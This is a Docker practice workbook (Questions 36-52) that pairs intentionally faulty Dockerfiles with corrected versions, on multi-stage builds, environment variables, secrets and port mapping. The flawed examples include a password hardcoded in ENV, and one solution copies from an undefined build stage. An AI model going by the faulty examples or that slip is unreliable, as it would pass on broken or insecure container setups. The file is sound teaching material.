# Docker Error Identification Practice - Questions 36-100

This file continues from Question 35 in the main practice file.

## Questions 36-40: Multi-Stage Build Errors (Continued)

### Question 36
**Dockerfile:**
```dockerfile
FROM python:3.9 AS base
RUN pip install flask

FROM base AS stage1
COPY app.py /app/

FROM base AS stage2  
COPY utils.py /app/

FROM stage1
COPY --from=stage2 /app/utils.py /app/
CMD ["python", "/app/app.py"]
```

**Tasks:**
a. What's inefficient about this structure?  
b. Simplify the Dockerfile

**Solution:**

**a. Inefficiency Issues:**

1. **Issue:** Over-complicated with unnecessary stages
2. **Issue:** Stage1 and stage2 do basically the same thing
3. **Issue:** No WORKDIR set
4. **Issue:** Copying files in convoluted way

**Corrected Dockerfile:**

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install dependencies
RUN pip install --no-cache-dir flask

# Copy all application files
COPY app.py utils.py ./

CMD ["python", "app.py"]
```

**Explanation for Beginners:**
- Don't over-engineer with unnecessary stages
- Multi-stage builds are for separating build and runtime, not organizing file copies
- Simple is better when there's no real benefit to complexity
- Use WORKDIR to organize files properly
- Only use multi-stage when you need to:
  - Separate build tools from runtime
  - Reduce final image size
  - Run tests without including them in final image

---

### Question 37
**Dockerfile:**
```dockerfile
FROM node:16 AS frontend
WORKDIR /app
COPY frontend/ .
RUN npm install && npm run build

FROM python:3.9 AS backend
WORKDIR /app
COPY backend/ .
RUN pip install -r requirements.txt

FROM nginx
COPY --from=frontend /app/build /usr/share/nginx/html
COPY --from=backend /app /app
CMD ["nginx", "-g", "daemon off;"]
```

**Tasks:**
a. What's wrong with this approach?  
b. How should it be structured?

**Solution:**

**a. Issues:**

1. **Error:** Trying to run two services (nginx + Python) in one container
2. **Error:** CMD only starts nginx, Python backend never runs
3. **Error:** Violates single-process-per-container principle
4. **Error:** Should use docker-compose or separate containers

**What Happens:**
```
Container starts → nginx runs → Python app never starts
```

**b. Corrected Approaches:**

**Option 1: Separate containers (recommended):**

**frontend/Dockerfile:**
```dockerfile
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

**backend/Dockerfile:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["gunicorn", "--bind", "0.0.0.0:5000", "app:app"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  frontend:
    build: ./frontend
    ports:
      - "80:80"
    depends_on:
      - backend
    networks:
      - app-network

  backend:
    build: ./backend
    ports:
      - "5000:5000"
    environment:
      - DATABASE_URL=postgresql://db:5432/myapp
    networks:
      - app-network

networks:
  app-network:
    driver: bridge
```

**Option 2: If you MUST run both (use supervisor):**
```dockerfile
FROM ubuntu:20.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    nginx \
    python3 \
    python3-pip \
    supervisor \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy frontend build
COPY --from=frontend-build /app/build /usr/share/nginx/html

# Copy backend
COPY backend/ .
RUN pip3 install -r requirements.txt

# Supervisor config
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf

EXPOSE 80 5000

CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
```

**supervisord.conf:**
```ini
[supervisord]
nodaemon=true

[program:nginx]
command=nginx -g "daemon off;"
autostart=true
autorestart=true

[program:backend]
command=python3 app.py
directory=/app
autostart=true
autorestart=true
```

**Explanation for Beginners:**

**Docker Best Practice: One Process Per Container**

**Why?**
1. **Easier scaling** - Scale frontend and backend independently
2. **Better isolation** - One service crash doesn't affect others
3. **Simpler debugging** - Check logs for specific service
4. **Resource management** - Allocate resources per service
5. **Independent updates** - Update frontend without touching backend

**Bad: Multiple processes in one container**
```dockerfile
FROM ubuntu
RUN install nginx python
CMD start-nginx && start-python  # Both in one container
```

**Good: One process per container**
```bash
docker run nginx-container  # Just nginx
docker run python-container # Just Python app
```

**Use docker-compose for multi-service applications!**

---

### Question 38
**Dockerfile:**
```dockerfile
FROM node:16 AS build
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
RUN npm run build
RUN rm -rf node_modules
RUN npm install --production

FROM node:16-alpine
COPY --from=build /app .
CMD ["node", "dist/server.js"]
```

**Tasks:**
a. What's redundant in the build stage?  
b. Optimize the Dockerfile

**Solution:**

**a. Redundancy Issues:**

1. **Issue:** Installing all dependencies, then removing, then reinstalling production ones
2. **Issue:** Wasteful - installs dependencies twice
3. **Issue:** node_modules copied to final stage (large)
4. **Issue:** Could use multi-stage more efficiently

**Corrected Dockerfile:**

**Option 1: Separate dependency stages:**
```dockerfile
# Dependencies stage
FROM node:16-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

# Build stage
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage
FROM node:16-alpine
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY --from=build /app/dist ./dist
COPY package*.json ./
CMD ["node", "dist/server.js"]
```

**Option 2: Better optimization:**
```dockerfile
# Build stage
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage
FROM node:16-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force
COPY --from=build /app/dist ./dist
CMD ["node", "dist/server.js"]
```

**Explanation for Beginners:**
- Don't install dependencies twice in same stage
- Use separate stages for build-time and runtime dependencies
- npm ci --only=production installs only production dependencies
- Smaller final image = faster deploys and less attack surface

---

### Question 39
**Dockerfile:**
```dockerfile
FROM python:3.9 AS base
RUN pip install django

FROM base AS migrations
COPY manage.py .
RUN python manage.py makemigrations

FROM base AS app
COPY . /app
CMD ["python", "manage.py", "runserver"]
```

**Tasks:**
a. What's wrong with running migrations in Dockerfile?  
b. Provide correct approach

**Solution:**

**a. Issues:**

1. **Error:** Migrations should run at runtime, not build time
2. **Error:** Database isn't available during docker build
3. **Error:** Migration files won't be in final image
4. **Error:** Migrations depend on database state, not build state

**What Happens:**
```
docker build → makemigrations runs → fails (no database connection)
OR creates migrations that aren't copied to final image
```

**Corrected Approach:**

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY . .

# Collect static files (this CAN be done at build time)
RUN python manage.py collectstatic --noinput

# Don't run migrations here!
# Use entrypoint script or container orchestration

EXPOSE 8000

CMD ["gunicorn", "--bind", "0.0.0.0:8000", "myproject.wsgi:application"]
```

**entrypoint.sh:**
```bash
#!/bin/bash
set -e

echo "Waiting for database..."
while ! nc -z db 5432; do
  sleep 0.1
done
echo "Database is ready!"

echo "Running migrations..."
python manage.py migrate --noinput

echo "Starting server..."
exec "$@"
```

**Updated Dockerfile with entrypoint:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN python manage.py collectstatic --noinput

# Copy and set entrypoint
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh && apt-get update && apt-get install -y netcat && rm -rf /var/lib/apt/lists/*

EXPOSE 8000

ENTRYPOINT ["/entrypoint.sh"]
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "myproject.wsgi:application"]
```

**Explanation for Beginners:**

**Build Time vs Runtime:**

**Build Time (Dockerfile RUN):**
- Static operations
- No external dependencies
- Installing packages
- Compiling code
- Collecting static files

**Runtime (Container starts):**
- Dynamic operations
- Requires external services (database, cache, etc.)
- Running migrations
- Creating database tables
- Connecting to services

**Migration Best Practices:**
1. Run migrations at container startup
2. Use entrypoint scripts
3. Or use init containers (Kubernetes)
4. Or use separate migration job
5. Never run migrations during docker build

---

### Question 40
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04 AS build
RUN apt-get update && apt-get install -y python3 python3-pip
COPY requirements.txt .
RUN pip3 install -r requirements.txt
COPY . /app

FROM ubuntu:20.04
COPY /app /app
CMD ["python3", "/app/app.py"]
```

**Tasks:**
a. What's wrong with the COPY in second stage?  
b. Fix the multi-stage build

**Solution:**

**a. Issues:**

1. **Error:** `COPY /app /app` tries to copy from host filesystem, not from build stage
2. **Error:** Should use `COPY --from=build /app /app`
3. **Issue:** Python dependencies not copied to second stage
4. **Issue:** Using full Ubuntu in both stages (wasteful)

**Corrected Dockerfile:**

```dockerfile
FROM python:3.9-slim AS build
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .

FROM python:3.9-slim
WORKDIR /app
COPY --from=build /usr/local/lib/python3.9/site-packages /usr/local/lib/python3.9/site-packages
COPY --from=build /app .
CMD ["python", "app.py"]
```

**Better approach (dependencies as wheels):**
```dockerfile
FROM python:3.9-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip wheel --no-cache-dir --wheel-dir /wheels -r requirements.txt

FROM python:3.9-slim
WORKDIR /app
COPY --from=builder /wheels /wheels
RUN pip install --no-cache /wheels/* && rm -rf /wheels
COPY . .
CMD ["python", "app.py"]
```

**Explanation for Beginners:**
- COPY without --from copies from build context (host), not from other stages
- Use `COPY --from=<stage>` to copy from previous build stages
- When copying Python dependencies, copy site-packages or use wheels
- Using Python slim images reduces size significantly

---

## Questions 41-50: Environment and ARG Errors

### Question 41
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
ENV DATABASE_PASSWORD=secret123
COPY app.py /app/
CMD ["python3", "/app/app.py"]
```

**Tasks:**
a. What's the security issue?  
b. How should secrets be handled?

**Solution:**

**a. Security Issue:**

1. **Error:** Hardcoded password in ENV is visible in image history
2. **Error:** Anyone can inspect the image and see the password
3. **Error:** Secrets baked into image layers

**Check password visibility:**
```bash
docker history myapp
docker inspect myapp
# Password is visible!
```

**Corrected Approaches:**

**Option 1: Pass at runtime:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y python3 && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY app.py .
# No hardcoded password!
CMD ["python3", "app.py"]
```

```bash
docker run -e DATABASE_PASSWORD=secret123 myapp
```

**Option 2: Use Docker secrets (Swarm):**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
# Read password from /run/secrets/db_password at runtime
CMD ["python", "app.py"]
```

```bash
echo "secret123" | docker secret create db_password -
docker service create --secret db_password myapp
```

**Option 3: Use secrets file:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
# Mount secrets file at runtime
CMD ["python", "app.py"]
```

```bash
docker run -v /path/to/secrets:/run/secrets:ro myapp
```

**Explanation for Beginners:**

**Never hardcode secrets in:**
- ENV variables in Dockerfile
- Files copied into image
- CMD or ENTRYPOINT commands

**Secure alternatives:**
1. Pass via `-e` flag at runtime
2. Use Docker secrets
3. Mount secret files as volumes
4. Use external secret managers (HashiCorp Vault, AWS Secrets Manager)
5. Use environment files with docker-compose

---

### Question 42
**Dockerfile:**
```dockerfile
ARG NODE_VERSION=14
FROM node:NODE_VERSION
WORKDIR /app
COPY . .
RUN npm install
CMD ["npm", "start"]
```

**Tasks:**
a. What's wrong with the ARG usage?  
b. Fix the Dockerfile

**Solution:**

**a. Error:**

1. **Error:** ARG variable not referenced correctly - missing `$` sign
2. **Error:** `FROM node:NODE_VERSION` should be `FROM node:${NODE_VERSION}`

**Corrected Dockerfile:**

```dockerfile
ARG NODE_VERSION=14
FROM node:${NODE_VERSION}-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["npm", "start"]
```

**Build command:**
```bash
# Use default
docker build -t myapp .

# Override version
docker build --build-arg NODE_VERSION=18 -t myapp:node18 .
```

**Explanation for Beginners:**

**ARG Syntax:**
```dockerfile
ARG VARIABLE=default_value
FROM image:${VARIABLE}      # Correct
FROM image:$VARIABLE        # Also works
FROM image:VARIABLE         # Wrong! Literal text
```

**ARG vs ENV:**
- **ARG:** Available only during build, can be overridden with --build-arg
- **ENV:** Available during build AND runtime, baked into image

```dockerfile
ARG BUILD_VERSION=1.0      # Only available during build
ENV APP_VERSION=1.0        # Available during build and runtime
```

---

### Question 43
**Dockerfile:**
```dockerfile
FROM python:3.9
ENV PYTHONPATH /app
ENV PYTHONPATH /app/src
COPY . /app
CMD ["python", "app.py"]
```

**Tasks:**
a. What happens with multiple ENV assignments?  
b. Fix the configuration

**Solution:**

**a. What Happens:**

1. **Issue:** Second ENV overwrites the first one
2. **Issue:** PYTHONPATH only contains `/app/src`, not `/app`

**What Actually Happens:**
```
First ENV: PYTHONPATH=/app
Second ENV: PYTHONPATH=/app/src  (overwrites first!)
Final value: /app/src only
```

**Corrected Dockerfile:**

**Option 1: Multiple paths in one ENV:**
```dockerfile
FROM python:3.9
WORKDIR /app
ENV PYTHONPATH=/app:/app/src
COPY . .
CMD ["python", "app.py"]
```

**Option 2: Append to existing:**
```dockerfile
FROM python:3.9
WORKDIR /app
ENV PYTHONPATH=/app
ENV PYTHONPATH=${PYTHONPATH}:/app/src
COPY . .
CMD ["python", "app.py"]
```

**Option 3: Set all environment variables together:**
```dockerfile
FROM python:3.9
WORKDIR /app
ENV PYTHONPATH=/app:/app/src \
    FLASK_APP=app.py \
    FLASK_ENV=production
COPY . .
CMD ["python", "app.py"]
```

**Explanation for Beginners:**

**ENV Behavior:**
- Each ENV creates a new layer
- Multiple ENVs for same variable → last one wins
- Use colon (`:`) to separate multiple paths (like Linux PATH)

**Best practices:**
```dockerfile
# Good: Multiple variables in one ENV
ENV VAR1=value1 \
    VAR2=value2 \
    VAR3=value3

# Good: Append to existing
ENV PATH=${PATH}:/app/bin

# Bad: Multiple ENVs for same variable
ENV VAR=value1
ENV VAR=value2  # Overwrites!
```

---

### Question 44
**Dockerfile:**
```dockerfile
FROM alpine
ARG USER_ID
ARG GROUP_ID
RUN adduser -u USER_ID -G GROUP_ID appuser
WORKDIR /app
COPY . .
CMD ["./app"]
```

**Tasks:**
a. Fix the ARG usage  
b. Add proper defaults

**Solution:**

**a. Errors:**

1. **Error:** ARG variables not referenced with `$` in RUN command
2. **Error:** No default values provided
3. **Error:** adduser syntax incorrect for alpine

**Corrected Dockerfile:**

```dockerfile
FROM alpine

ARG USER_ID=1000
ARG GROUP_ID=1000

RUN addgroup -g ${GROUP_ID} appuser && \
    adduser -D -u ${USER_ID} -G appuser appuser

WORKDIR /app

COPY --chown=appuser:appuser . .

USER appuser

CMD ["./app"]
```

**Build commands:**
```bash
# Use defaults
docker build -t myapp .

# Override with your user ID
docker build \
  --build-arg USER_ID=$(id -u) \
  --build-arg GROUP_ID=$(id -g) \
  -t myapp .
```

**Explanation for Beginners:**

**Using ARG variables:**
```dockerfile
ARG VARIABLE=default
RUN command ${VARIABLE}      # Correct
RUN command $VARIABLE        # Also works
RUN command VARIABLE         # Wrong! Literal text
```

**ARG Best Practices:**
1. Always provide default values
2. Use ${VARIABLE} syntax for clarity
3. ARG values can be overridden at build time
4. Document what each ARG is for
5. Use ARG for build-time configuration only

---

### Question 45
**Dockerfile:**
```dockerfile
FROM node:14
ENV NODE_ENV production
COPY . /app
WORKDIR /app
RUN npm install
CMD ["npm", "start"]
```

**Tasks:**
a. What's the problem with NODE_ENV and npm install?  
b. Fix the issue

**Solution:**

**a. Problem:**

1. **Issue:** Setting NODE_ENV=production BEFORE npm install
2. **Issue:** npm install with NODE_ENV=production skips devDependencies
3. **Issue:** If build script needs devDependencies, build will fail

**What Happens:**
```
NODE_ENV=production set
npm install runs → only installs production dependencies
npm run build needs webpack → webpack not installed (it's a devDependency!)
Build fails!
```

**Corrected Dockerfile:**

**Option 1: Set NODE_ENV after install:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build
# Set NODE_ENV after build
ENV NODE_ENV=production
CMD ["npm", "start"]
```

**Option 2: Multi-stage (better):**
```dockerfile
# Build stage (no NODE_ENV restriction)
FROM node:14-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage
FROM node:14-alpine
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --only=production
COPY --from=build /app/dist ./dist
CMD ["node", "dist/server.js"]
```

**Explanation for Beginners:**

**NODE_ENV affects npm behavior:**
- `NODE_ENV=production` → npm install skips devDependencies
- Dev dependencies often include build tools (webpack, babel, etc.)
- Set NODE_ENV AFTER building, BEFORE running

**Best practice workflow:**
1. Install all dependencies (including dev)
2. Build the application
3. In production stage, install only production dependencies
4. Set NODE_ENV=production
5. Run the application

---

### Question 46
**Dockerfile:**
```dockerfile
FROM python:3.9
ARG APP_PORT
EXPOSE APP_PORT
CMD ["python", "app.py"]
```

**Tasks:**
a. Fix the EXPOSE issue  
b. Make port configurable properly

**Solution:**

**a. Error:**

1. **Error:** EXPOSE doesn't support ARG variables directly in older Docker versions
2. **Error:** Need to use ENV or shell form

**Corrected Dockerfile:**

**Option 1: Convert ARG to ENV:**
```dockerfile
FROM python:3.9
ARG APP_PORT=8000
ENV PORT=${APP_PORT}
WORKDIR /app
COPY . .
EXPOSE ${PORT}
CMD ["sh", "-c", "python app.py --port=${PORT}"]
```

**Option 2: Use ENV directly:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
ENV PORT=8000
EXPOSE ${PORT}
CMD ["sh", "-c", "python app.py --port=${PORT}"]
```

**Option 3: Fixed port in Dockerfile, configure at runtime:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 8000
CMD ["python", "app.py"]
```

```bash
# Application reads PORT from environment
docker run -e PORT=9000 -p 9000:9000 myapp
```

**Explanation for Beginners:**
- EXPOSE is documentation only, doesn't publish ports
- Use ENV for runtime configuration
- ARG is for build-time only
- For flexibility, read port from ENV in your application code

---

### Question 47
**Dockerfile:**
```dockerfile
FROM alpine
ENV USER appuser
RUN adduser -D USER
USER USER
WORKDIR /app
COPY . .
CMD ["./start.sh"]
```

**Tasks:**
a. What's wrong with ENV variable usage?  
b. Fix the user creation

**Solution:**

**a. Errors:**

1. **Error:** ENV variables not referenced with `$` in RUN and USER commands
2. **Error:** Creates user literally named "USER" instead of "appuser"
3. **Error:** Switches to user literally named "USER"

**What Happens:**
```
ENV USER=appuser        Set variable
RUN adduser -D USER     Creates user named "USER" (literal!)
USER USER              Switches to user "USER" (literal!)
```

**Corrected Dockerfile:**

```dockerfile
FROM alpine

ENV USERNAME=appuser

RUN adduser -D ${USERNAME}

USER ${USERNAME}

WORKDIR /app

COPY --chown=${USERNAME}:${USERNAME} . .

CMD ["./start.sh"]
```

**Or simpler without variable:**
```dockerfile
FROM alpine

RUN adduser -D appuser

USER appuser

WORKDIR /app

COPY --chown=appuser:appuser . .

CMD ["./start.sh"]
```

**Explanation for Beginners:**

**ENV Variable Usage:**
```dockerfile
ENV VARIABLE=value

# Use in RUN, CMD, etc:
RUN command ${VARIABLE}      # Correct
RUN command $VARIABLE        # Also works
RUN command VARIABLE         # Wrong! Literal text
```

**Example:**
```dockerfile
ENV APP_DIR=/app
WORKDIR ${APP_DIR}           # Creates /app
WORKDIR APP_DIR              # Creates /APP_DIR (literal!)
```

---

### Question 48
**Dockerfile:**
```dockerfile
FROM node:14
ARG API_URL=http://localhost:3000
ENV API_URL=${API_URL}
RUN echo ${API_URL} > /app/config.txt
COPY . /app
CMD ["npm", "start"]
```

**Commands:**
```bash
docker build --build-arg API_URL=https://api.production.com -t myapp .
```

**Tasks:**
a. What's the problem with this approach?  
b. Provide a better solution

**Solution:**

**a. Problems:**

1. **Issue:** Baking API URL into image at build time
2. **Issue:** Need to rebuild image for different environments (dev/staging/prod)
3. **Issue:** Less flexible - can't reuse same image across environments
4. **Issue:** config.txt file created but never used properly

**Why This is Bad:**
- One image per environment (dev image, staging image, prod image)
- Can't promote same image through environments
- Defeats purpose of containers being portable

**b. Better Solutions:**

**Option 1: Set at runtime only:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
# Don't set API_URL here!
CMD ["npm", "start"]
```

```bash
# Development
docker run -e API_URL=http://localhost:3000 myapp

# Production
docker run -e API_URL=https://api.production.com myapp
```

**Option 2: With defaults:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
ENV API_URL=http://localhost:3000
CMD ["npm", "start"]
```

```bash
# Uses default for development
docker run myapp

# Override for production
docker run -e API_URL=https://api.production.com myapp
```

**Option 3: Use entrypoint script:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
CMD ["npm", "start"]
```

**entrypoint.sh:**
```bash
#!/bin/sh
# Create config file from environment variables at runtime
cat > /app/config.json <<EOF
{
  "apiUrl": "${API_URL:-http://localhost:3000}",
  "environment": "${NODE_ENV:-development}"
}
EOF

exec "$@"
```

**Explanation for Beginners:**

**Build-time vs Runtime Configuration:**

**Build-time (BAD for environment-specific config):**
```dockerfile
ARG API_URL=https://prod.example.com
ENV API_URL=${API_URL}
# Baked into image - need different image per environment
```

**Runtime (GOOD):**
```bash
docker run -e API_URL=https://prod.example.com myapp
# Same image works for all environments
```

**Best Practices:**
1. **Build once, run anywhere** - don't bake environment config into images
2. **Use ENV at runtime** - pass with `-e` flag or env files
3. **Provide sensible defaults** - for development
4. **Document required env vars** - in README
5. **Use configuration files** - generated at startup from env vars

---

### Question 49
**Dockerfile:**
```dockerfile
FROM python:3.9
ARG DEBUG=true
RUN if [ $DEBUG ]; then pip install debugpy; fi
COPY . /app
WORKDIR /app
CMD ["python", "app.py"]
```

**Tasks:**
a. What's wrong with the conditional check?  
b. Fix the logic

**Solution:**

**a. Error:**

1. **Error:** `if [ $DEBUG ]` checks if variable is set, not if it equals "true"
2. **Issue:** `DEBUG=false` will still evaluate to true (string is set)

**What Happens:**
```bash
docker build --build-arg DEBUG=false -t myapp .
# if [ $DEBUG ] → if [ false ] → true! (string exists)
# debugpy gets installed even when DEBUG=false
```

**Corrected Dockerfile:**

**Option 1: Proper string comparison:**
```dockerfile
FROM python:3.9

ARG DEBUG=false

RUN if [ "$DEBUG" = "true" ]; then \
      pip install --no-cache-dir debugpy; \
    fi

WORKDIR /app
COPY . .

CMD ["python", "app.py"]
```

**Option 2: Case-insensitive check:**
```dockerfile
FROM python:3.9

ARG DEBUG=false

RUN if [ "$(echo $DEBUG | tr '[:upper:]' '[:lower:]')" = "true" ]; then \
      pip install --no-cache-dir debugpy; \
    fi

WORKDIR /app
COPY . .

CMD ["python", "app.py"]
```

**Option 3: Multi-stage approach:**
```dockerfile
FROM python:3.9 AS base
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM base AS development
RUN pip install --no-cache-dir debugpy pytest black
COPY . .
CMD ["python", "app.py"]

FROM base AS production
COPY . .
RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser
CMD ["python", "app.py"]
```

```bash
# Development build (includes debugpy)
docker build --target development -t myapp:dev .

# Production build (no debugpy)
docker build --target production -t myapp:prod .
```

**Explanation for Beginners:**

**Shell Conditional Tests:**

```bash
# Wrong: Checks if variable is set (non-empty)
if [ $DEBUG ]; then ...
# "true" → true
# "false" → true (string exists!)
# "" → false

# Correct: String comparison
if [ "$DEBUG" = "true" ]; then ...
# "true" → true
# "false" → false
# "" → false

# Numeric comparison
if [ $COUNT -gt 0 ]; then ...
```

**ARG Conditional Patterns:**

**Pattern 1: String comparison:**
```dockerfile
ARG ENVIRONMENT=production
RUN if [ "$ENVIRONMENT" = "development" ]; then \
      install-dev-tools; \
    fi
```

**Pattern 2: Boolean-style:**
```dockerfile
ARG ENABLE_FEATURE=false
RUN if [ "$ENABLE_FEATURE" = "true" ]; then \
      enable-feature; \
    fi
```

**Pattern 3: Multiple conditions:**
```dockerfile
ARG ENV=prod
RUN if [ "$ENV" = "dev" ] || [ "$ENV" = "test" ]; then \
      install-dev-deps; \
    fi
```

---

### Question 50
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
ENV PATH /app/bin
COPY . /app
WORKDIR /app
CMD ["my-app"]
```

**Tasks:**
a. What will happen to the system PATH?  
b. Fix the PATH configuration

**Solution:**

**a. What Happens:**

1. **Error:** PATH completely overwritten - loses system paths
2. **Error:** System commands like `ls`, `cat`, etc. won't work
3. **Error:** Container might not function properly

**What Actually Happens:**
```
Original PATH: /usr/local/bin:/usr/bin:/bin
After ENV PATH /app/bin: PATH=/app/bin
Lost: All system binary locations!

Trying to run: ls
Error: command not found
```

**Corrected Dockerfile:**

**Option 1: Prepend to PATH:**
```dockerfile
FROM ubuntu:20.04
WORKDIR /app
COPY . .
ENV PATH=/app/bin:${PATH}
CMD ["my-app"]
```

**Option 2: Append to PATH:**
```dockerfile
FROM ubuntu:20.04
WORKDIR /app
COPY . .
ENV PATH=${PATH}:/app/bin
CMD ["my-app"]
```

**Option 3: Multiple paths:**
```dockerfile
FROM ubuntu:20.04
WORKDIR /app
COPY . .
ENV PATH=/app/bin:/app/scripts:${PATH}
CMD ["my-app"]
```

**Explanation for Beginners:**

**PATH Environment Variable:**
- Contains directories where system looks for executables
- Separated by colons (`:`)
- Order matters - searches left to right

**Wrong: Overwriting PATH**
```dockerfile
ENV PATH=/app/bin
# Result: PATH=/app/bin
# Lost all system paths!
```

**Right: Prepending to PATH**
```dockerfile
ENV PATH=/app/bin:${PATH}
# Result: PATH=/app/bin:/usr/local/bin:/usr/bin:/bin
# Your binaries found first, system binaries still available
```

**Right: Appending to PATH**
```dockerfile
ENV PATH=${PATH}:/app/bin
# Result: PATH=/usr/local/bin:/usr/bin:/bin:/app/bin
# System binaries found first, then your binaries
```

**When to prepend vs append:**
- **Prepend:** Your binaries should override system ones
- **Append:** System binaries have priority

**Complete Example:**
```dockerfile
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y python3 && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy application binaries
COPY bin/ ./bin/
COPY scripts/ ./scripts/

# Add to PATH (prepend - our tools have priority)
ENV PATH=/app/bin:/app/scripts:${PATH}

# Other environment variables
ENV PYTHONPATH=/app \
    APP_HOME=/app

# Copy rest of application
COPY . .

CMD ["my-app"]
```

---

## Questions 51-60: Port and Networking Errors

### Question 51
**Dockerfile:**
```dockerfile
FROM nginx
EXPOSE 80
COPY nginx.conf /etc/nginx/nginx.conf
```

**nginx.conf:**
```nginx
server {
    listen 8080;
    location / {
        root /usr/share/nginx/html;
    }
}
```

**Command:**
```bash
docker run -p 80:80 myapp
```

**Tasks:**
a. What's the mismatch?  
b. Fix the configuration

**Solution:**

**a. Mismatch:**

1. **Error:** EXPOSE says port 80, but nginx listens on 8080
2. **Error:** Port mapping is 80:80, but container uses 8080
3. **Error:** Connection will fail

**What Happens:**
```
docker run -p 80:80 myapp
Host:80 → Container:80 (but nginx listens on 8080!)
Connection refused!
```

**Corrected Approaches:**

**Option 1: Match EXPOSE to nginx config:**
```dockerfile
FROM nginx:alpine
EXPOSE 8080
COPY nginx.conf /etc/nginx/nginx.conf
COPY html/ /usr/share/nginx/html/
```

```bash
docker run -p 80:8080 myapp
```

**Option 2: Match nginx config to EXPOSE:**
```dockerfile
FROM nginx:alpine
EXPOSE 80
COPY nginx.conf /etc/nginx/nginx.conf
```

**nginx.conf:**
```nginx
server {
    listen 80;
    location / {
        root /usr/share/nginx/html;
    }
}
```

```bash
docker run -p 80:80 myapp
```

**Explanation for Beginners:**

**Port Mapping Must Match:**
```
EXPOSE → Documents which port container listens on
nginx config → Actually determines which port nginx uses
docker run -p → Maps host port to container port

All three must align!
```

**Example of correct alignment:**
```dockerfile
EXPOSE 8080              # Document container port
```
```nginx
listen 8080;             # Nginx listens on this port
```
```bash
docker run -p 80:8080    # Map host:80 to container:8080
```

---

### Question 52
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 5000 8000
CMD ["python", "app.py"]
```

**Command:**
```bash
docker run -P myapp
```

**Tasks:**
a. What does -P do?  
b. When would you use -P vs -p?

**Solution:**

**a. What -P Does:**

1. **-P (uppercase):** Publishes ALL exposed ports to random host ports
2. **Result:** Port 5000 → random host port (e.g., 32768)
3. **Result:** Port 8000 → random host port (e.g., 32769)

**Check which ports were assigned:**
```bash
docker ps
# or
docker port container_name
```

**b. When to Use Each:**

**Use -P (uppercase):**
- Quick testing
- Don't care about specific host ports
- Running multiple instances

**Use -p (lowercase):**
- Production deployments
- Need specific host ports
- Clear port mapping

**Comparison:**

```bash
# -P: Random host ports
docker run -P myapp
# Result: 0.0.0.0:32768->5000/tcp, 0.0.0.0:32769->8000/tcp

# -p: Specific host ports
docker run -p 5000:5000 -p 8000:8000 myapp
# Result: 0.0.0.0:5000->5000/tcp, 0.0.0.0:8000->8000/tcp

# -p: Different host ports
docker run -p 3000:5000 -p 3001:8000 myapp
# Result: 0.0.0.0:3000->5000/tcp, 0.0.0.0:3001->8000/tcp
```

**Explanation for Beginners:**

**Port Mapping Options:**

**-p (lowercase)** - Explicit mapping:
```bash
-p 8080:80              # Host 8080 → Container 80
-p 127.0.0.1:8080:80    # Only localhost:8080 → Container 80
-p 8080:80/tcp          # TCP protocol (default)
-p 8080:80/udp          # UDP protocol
```

**-P (uppercase)** - Auto-map ALL exposed ports:
```bash
docker run -P myapp
# Maps ALL EXPOSE ports to random host ports
```

**Best Practices:**
